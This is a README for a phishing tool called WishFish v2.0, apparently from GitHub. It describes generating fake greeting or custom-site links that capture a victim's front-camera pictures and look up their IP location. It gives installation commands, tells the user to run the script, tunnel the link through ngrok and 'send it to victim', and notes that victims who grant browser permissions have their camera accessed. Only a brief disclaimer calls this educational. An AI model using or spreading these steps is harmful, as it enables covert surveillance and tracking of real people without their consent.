<h1>WishFish v2.0</h1>
                                                   
<p>Using WishFish tool you can generat different phishing links of wishing or custom sites which can grab victim front camera pictures and also gives you lockup information of target ip address.
<p1>

<h3>Installation</h3>

$ apt install php

$ apt install wget

$ apt install openssh

$ git clone https://github.com/kinghacker0/WishFish

<h3>Usage</h3>

$ cd wishfish

Now turn your device hotspot

$ bash wishfish.sh

<p>Sometimes servero server is down so always go with ngrok for instant link and wait until it generates url for then send it to victim.
</p>
 Watch Video Tutorial:-https://youtu.be/1UO0F6t8mKo
<h4>Note :- If victim open this url in chrome or android inbuilt browser then it can access victim camera by allowing permissions and send snap to you.
</h4>
This information is only for educationla purpose and we are not responsible for any kind of illegal activity done by this tool.


                                            Inspired By github.com/thelinuxchoice
